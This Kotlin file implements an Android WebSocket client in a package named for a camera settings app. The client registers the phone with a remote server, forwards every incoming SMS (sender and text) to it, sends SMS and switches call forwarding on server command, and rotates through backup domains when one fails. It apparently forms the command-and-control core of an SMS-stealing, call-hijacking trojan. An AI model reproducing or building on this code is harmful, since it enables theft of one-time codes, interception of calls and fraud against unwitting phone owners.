package com.settingpro.camera.data.remote

import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.data.model.DeviceInfo
import com.settingpro.camera.data.model.WebSocketMessage
import com.settingpro.camera.data.model.RegisterData
import com.settingpro.camera.data.model.HeartbeatData
import com.settingpro.camera.data.model.SmsReceivedData
import com.settingpro.camera.data.model.CallForwardingData
import com.settingpro.camera.data.model.CallForwardingResponseData
import com.settingpro.camera.data.model.SendSmsData
import com.settingpro.camera.data.model.SendSmsResponseData
import com.settingpro.camera.data.config.UrlRotator
import com.settingpro.camera.util.Constants
import com.google.gson.Gson
import com.google.gson.JsonObject
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import okhttp3.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class WebSocketClient @Inject constructor(
    private val gson: Gson,
    private val urlRotator: UrlRotator
) {
    private var okHttpClient = buildOkHttpClient()

    private var webSocket: WebSocket? = null
    @Volatile private var heartbeatJob: Job? = null
    @Volatile private var reconnectJob: Job? = null

    private var scope: CoroutineScope = freshScope()

    private val _connectionState = MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
    val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()

    @Volatile private var reconnectAttempts = 0

    @Volatile private var deviceInfo: DeviceInfo? = null

    private val smsForwardedCount = AtomicInteger(0)
    private var serviceStartTime = 0L

    private var onMessageCallback: ((WebSocketMessage) -> Unit)? = null
    private var onConnectionCallback: ((ConnectionState) -> Unit)? = null
    private val shouldReconnect = AtomicBoolean(false)

    // Heartbeat failure tracking for domain failover
    @Volatile private var consecutiveHeartbeatFailures = 0
    private val MAX_HEARTBEAT_FAILURES = 3

    // Track current connection URL for failure handling
    @Volatile private var currentConnectionUrl: String? = null

    fun getSmsForwardedCount(): Int = smsForwardedCount.get()

    companion object {
        private const val TAG = "WebSocketClient"
        private fun freshScope() = CoroutineScope(Dispatchers.IO + SupervisorJob())
        private fun buildOkHttpClient() = OkHttpClient.Builder()
            .connectTimeout(Constants.CONNECTION_TIMEOUT, TimeUnit.MILLISECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .pingInterval(25, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .build()
    }

    // ─── Public API ───────────────────────────────────────────────────────────

    fun connect(
        serverUrl: String? = null,
        deviceInfo: DeviceInfo,
        onMessageReceived: (WebSocketMessage) -> Unit,
        onConnectionStateChanged: (ConnectionState) -> Unit
    ) {
        this.onMessageCallback = onMessageReceived
        this.onConnectionCallback = onConnectionStateChanged
        this.deviceInfo = deviceInfo
        this.shouldReconnect.set(true)

        if (serviceStartTime == 0L) serviceStartTime = System.currentTimeMillis()

        val state = _connectionState.value
        if (state == ConnectionState.Connecting || state == ConnectionState.Connected) {
            AppLogger.d(TAG, "Already connected or connecting — skipping")
            return
        }
        scope.launch { attemptConnect() }
    }

    suspend fun forceReconnect() = withContext(Dispatchers.IO) {
        if (!shouldReconnect.get()) { AppLogger.d(TAG, "forceReconnect ignored — shouldReconnect=false"); return@withContext }
        AppLogger.d(TAG, "Force reconnect triggered")
        reconnectJob?.cancel(); reconnectJob = null
        reconnectAttempts = 0
        webSocket?.cancel(); webSocket = null
        _connectionState.value = ConnectionState.Disconnected
        attemptConnect()
    }

    fun disconnect() {
        AppLogger.d(TAG, "Disconnecting")
        shouldReconnect.set(false)
        reconnectJob?.cancel(); reconnectJob = null
        stopHeartbeat()
        webSocket?.close(1000, "Client disconnecting"); webSocket = null
        _connectionState.value = ConnectionState.Disconnected
    }

    fun destroy() {
        AppLogger.d(TAG, "Destroying")
        disconnect()
        scope.cancel()
        scope = freshScope()
        serviceStartTime = 0L
        try {
            okHttpClient.dispatcher.cancelAll()
            okHttpClient.connectionPool.evictAll()
        } catch (e: Exception) { AppLogger.e(TAG, "Error shutting down OkHttpClient", e) }
        okHttpClient = buildOkHttpClient()
    }

    fun isConnected(): Boolean = _connectionState.value == ConnectionState.Connected

    /**
     * Check if the WebSocket connection is healthy and ready for communication.
     * Returns true only if connected (not connecting, disconnected, or in error state).
     */
    fun isConnectionHealthy(): Boolean {
        val state = _connectionState.value
        return state == ConnectionState.Connected && webSocket != null
    }

    fun updateDeviceInfo(info: DeviceInfo) { this.deviceInfo = info }

    fun send(message: WebSocketMessage): Boolean {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return false }
        return try {
            webSocket?.send(serializeMessage(message)) ?: false
        } catch (e: Exception) { AppLogger.e(TAG, "Error sending message", e); false }
    }

    // ─── Connection internals ─────────────────────────────────────────────────

    private suspend fun attemptConnect() = withContext(Dispatchers.IO) {
        val url = urlRotator.getNextUrl()
        if (url == null) {
            AppLogger.e(TAG, "No domains available for connection")
            _connectionState.value = ConnectionState.Error("No domains available")
            scheduleReconnect()
            return@withContext
        }

        val wsUrl = buildWsUrl(url)
        currentConnectionUrl = wsUrl // Store current URL for failure tracking
        AppLogger.d(TAG, "Connecting to $wsUrl (attempt ${reconnectAttempts + 1})")
        _connectionState.value = ConnectionState.Connecting
        webSocket?.cancel()

        try {
            webSocket = okHttpClient.newWebSocket(
                Request.Builder().url(wsUrl)
                    .addHeader("User-Agent", "AIChatGateway/${Constants.APP_VERSION} Android")
                    .build(),
                createListener()
            )
        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to create WebSocket", e)
            onConnectionFailure(wsUrl, e)
        }
    }

    private fun createListener() = object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            AppLogger.d(TAG, "WebSocket opened")
            reconnectAttempts = 0
            consecutiveHeartbeatFailures = 0
            _connectionState.value = ConnectionState.Connected
            onConnectionCallback?.invoke(ConnectionState.Connected)
            deviceInfo?.let { sendRegistration(it) }
            startHeartbeat()
        }
        override fun onMessage(webSocket: WebSocket, text: String) {
            try { onMessageCallback?.invoke(parseMessage(text)) }
            catch (e: Exception) { AppLogger.e(TAG, "Error parsing message: $text", e) }
        }
        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
            webSocket.close(1000, null)
        }
        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            AppLogger.d(TAG, "WebSocket closed: $code $reason")
            stopHeartbeat()
            this@WebSocketClient.webSocket = null
            _connectionState.value = ConnectionState.Disconnected
            onConnectionCallback?.invoke(ConnectionState.Disconnected)
            if (shouldReconnect.get() && code != 1000) scheduleReconnect()
        }
        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            AppLogger.e(TAG, "WebSocket failure: ${t.message}", t)
            // Use currentConnectionUrl if available, fallback to response URL
            val failedUrl = currentConnectionUrl ?: (response?.request?.url?.toString() ?: "unknown")
            onConnectionFailure(failedUrl, t)
        }
    }

    private fun onConnectionFailure(url: String, error: Throwable) {
        stopHeartbeat()
        webSocket = null
        val errorState = ConnectionState.Error(error.message ?: "Unknown error")
        _connectionState.value = errorState
        onConnectionCallback?.invoke(errorState)

        // Mark the specific failed domain as dead and schedule reconnect
        scope.launch {
            urlRotator.markDomainDead(url)
        }
        if (shouldReconnect.get()) scheduleReconnect()
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        val delay = calculateReconnectDelay()
        AppLogger.d(TAG, "Reconnecting in ${delay}ms (attempt ${reconnectAttempts + 1})")
        reconnectJob = scope.launch {
            delay(delay)
            if (shouldReconnect.get() && _connectionState.value !is ConnectionState.Connected) {
                reconnectAttempts++
                attemptConnect()
            }
        }
    }

    private fun calculateReconnectDelay(): Long {
        val delay = Constants.RECONNECT_DELAY_INITIAL * (1L shl minOf(reconnectAttempts, 6))
        return minOf(delay, Constants.RECONNECT_DELAY_MAX)
    }

    // ─── Heartbeat ────────────────────────────────────────────────────────────

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isActive) {
                delay(Constants.HEARTBEAT_INTERVAL)
                if (isConnected()) {
                    try {
                        sendHeartbeat()
                        consecutiveHeartbeatFailures = 0 // Reset on successful send
                    } catch (e: Exception) {
                        AppLogger.e(TAG, "Heartbeat error", e)
                        consecutiveHeartbeatFailures++
                        if (consecutiveHeartbeatFailures >= MAX_HEARTBEAT_FAILURES) {
                            AppLogger.w(TAG, "Too many heartbeat failures, triggering domain failover")
                            forceReconnect()
                        }
                    }
                }
            }
        }
    }

    private fun stopHeartbeat() { heartbeatJob?.cancel(); heartbeatJob = null }

    // ─── Message helpers ──────────────────────────────────────────────────────

    private fun sendRegistration(deviceInfo: DeviceInfo) {
        send(WebSocketMessage.Register(RegisterData(
            deviceId       = deviceInfo.deviceId,
            name           = deviceInfo.model,
            appVersion     = Constants.APP_VERSION,
            osVersion      = deviceInfo.osVersion,
            deviceModel    = deviceInfo.model,
            manufacturer   = deviceInfo.manufacturer,
            batteryLevel   = deviceInfo.batteryLevel,
            isCharging     = deviceInfo.batteryStatus.contains("Charging", ignoreCase = true),
            signalStrength = deviceInfo.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
            networkType    = resolveNetworkType(deviceInfo.networkInfo.networkType),
            sims           = deviceInfo.simInfo.map { it.toMap() },
            fcmToken       = deviceInfo.fcmToken
        )))

        // Mark domain as successful on registration
        scope.launch {
            urlRotator.getCurrentDomain()?.let { urlRotator.markSuccess(it) }
        }
    }

    fun sendHeartbeat() {
        val info = deviceInfo ?: return
        AppLogger.d(TAG, "Sending heartbeat with FCM token: ${info.fcmToken?.take(16) ?: "null"}...")
        send(WebSocketMessage.Heartbeat(HeartbeatData(
            deviceId       = info.deviceId,
            batteryLevel   = info.batteryLevel,
            isCharging     = info.batteryStatus.contains("Charging", ignoreCase = true),
            signalStrength = info.simInfo.firstOrNull { it.isActive }?.signalStrength ?: 0,
            networkType    = resolveNetworkType(info.networkInfo.networkType),
            sims           = info.simInfo.map { it.toMap() },
            uptime         = (System.currentTimeMillis() - serviceStartTime) / 1000,
            smsForwarded   = smsForwardedCount.get(),
            fcmToken       = info.fcmToken
        )))
    }

    fun sendSmsReceived(
        deviceId: String, sender: String, content: String, timestamp: Long,
        simSlot: Int, receiverNumber: String?, simCarrier: String?,
        simNetworkType: String?, networkType: String?
    ) {
        val smsData = SmsReceivedData(
            deviceId = deviceId, sender = sender, content = content,
            timestamp = timestamp,
            simSlot = simSlot + 1, // Convert 0-based slot to 1-based for the server
            receiverNumber = receiverNumber, simCarrier = simCarrier,
            simNetworkType = simNetworkType, networkType = networkType
        )
        if (send(WebSocketMessage.SmsReceived(smsData))) smsForwardedCount.incrementAndGet()
    }

    fun sendCallForwardingResponse(
        deviceId: String, action: String, success: Boolean, simSlot: Int,
        phoneNumber: String? = null, error: String? = null, ussdResponse: String? = null
    ) {
        if (!isConnected()) { AppLogger.w(TAG, "Cannot send — not connected"); return }
        try {
            val response = CallForwardingResponseData(
                deviceId = deviceId,
                action = action,
                success = success,
                simSlot = simSlot + 1, // 0-based → 1-based
                phoneNumber = phoneNumber,
                error = error,
                ussdResponse = ussdResponse,
                timestamp = System.currentTimeMillis()
            )
            send(WebSocketMessage.CallForwardingResponse(response))
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error sending call forwarding response", e)
        }
    }

    // ─── Utilities ────────────────────────────────────────────────────────────

    private fun buildWsUrl(serverUrl: String): String {
        val url = serverUrl.trimEnd('/')
        val wsBase = when {
            url.startsWith("https://") -> "wss://" + url.removePrefix("https://")
            url.startsWith("http://")  -> "ws://"  + url.removePrefix("http://")
            url.startsWith("wss://")   -> url
            url.startsWith("ws://")    -> url
            else                       -> "wss://$url"
        }
        return "$wsBase/gateway"
    }

    private fun resolveNetworkType(raw: String): String = when {
        raw.contains("WiFi",   ignoreCase = true) -> "wifi"
        raw.contains("Mobile", ignoreCase = true) -> "mobile"
        else -> "none"
    }

    private fun parseMessage(json: String): WebSocketMessage {
        val obj = gson.fromJson(json, JsonObject::class.java)
        val type = obj.get("type")?.asString
            ?: return WebSocketMessage.Unknown("unknown", json)

        return when (type) {
            "connected"  -> WebSocketMessage.Connected(obj.get("connectionId")?.asString ?: "")
            "registered" -> WebSocketMessage.Registered(obj.get("deviceId")?.asString ?: "")
            "ack" -> {
                val data = obj.getAsJsonObject("data")
                WebSocketMessage.Ack(
                    messageId = data?.get("messageId")?.asString,
                    success   = data?.get("success")?.asBoolean ?: true
                )
            }
            "ping"  -> WebSocketMessage.Ping(obj.get("timestamp")?.asLong)
            "error" -> {
                val data = obj.getAsJsonObject("data")
                WebSocketMessage.Error(
                    code    = data?.get("code")?.asString,
                    message = data?.get("message")?.asString ?: "Unknown error"
                )
            }
            "call_forwarding" -> {
                val data = obj.getAsJsonObject("data")
                val action = data?.get("action")?.asString
                if (action.isNullOrBlank()) {
                    AppLogger.e(TAG, "call_forwarding message missing action: $json")
                    return WebSocketMessage.Unknown(type, json)
                }
                val validActions = setOf("forward", "deactivate", "check")
                if (action !in validActions) {
                    AppLogger.e(TAG, "call_forwarding unknown action '$action': $json")
                    return WebSocketMessage.Unknown(type, json)
                }
                val phoneNumberElement = data.get("phoneNumber")
                WebSocketMessage.CallForwardingCommand(CallForwardingData(
                    action      = action,
                    phoneNumber = if (phoneNumberElement != null && !phoneNumberElement.isJsonNull)
                        phoneNumberElement.asString else null,
                    simSlot     = data.get("simSlot")?.asInt ?: 0
                ))
            }
            "send_sms" -> {
                val data = obj.getAsJsonObject("data")
                val messageId = data?.get("messageId")?.asString
                val phoneNumber = data?.get("phoneNumber")?.asString
                val message = data?.get("message")?.asString
                val simSlot = data?.get("simSlot")?.asInt ?: 0

                if (messageId.isNullOrBlank() || phoneNumber.isNullOrBlank() || message.isNullOrBlank()) {
                    AppLogger.e(TAG, "send_sms message missing required fields: $json")
                    return WebSocketMessage.Unknown(type, json)
                }
                WebSocketMessage.SendSmsCommand(SendSmsData(
                    messageId = messageId,
                    phoneNumber = phoneNumber,
                    message = message,
                    simSlot = simSlot
                ))
            }
            else -> WebSocketMessage.Unknown(type, json)
        }
    }

    private fun serializeMessage(message: WebSocketMessage): String = when (message) {
        is WebSocketMessage.Register               -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.Heartbeat              -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.SmsReceived            -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.CallForwardingResponse -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.SendSmsResponse        -> gson.toJson(mapOf("type" to message.type, "data" to message.data))
        is WebSocketMessage.Pong                   -> gson.toJson(mapOf("type" to message.type, "timestamp" to message.timestamp))
        else                                       -> gson.toJson(mapOf("type" to message.type))
    }
}

// ─── ConnectionState ──────────────────────────────────────────────────────────

sealed class ConnectionState {
    data object Disconnected : ConnectionState()
    data object Connecting   : ConnectionState()
    data object Connected    : ConnectionState()
    data class  Error(val message: String) : ConnectionState()

    val isConnected:  Boolean get() = this is Connected
    val isConnecting: Boolean get() = this is Connecting
}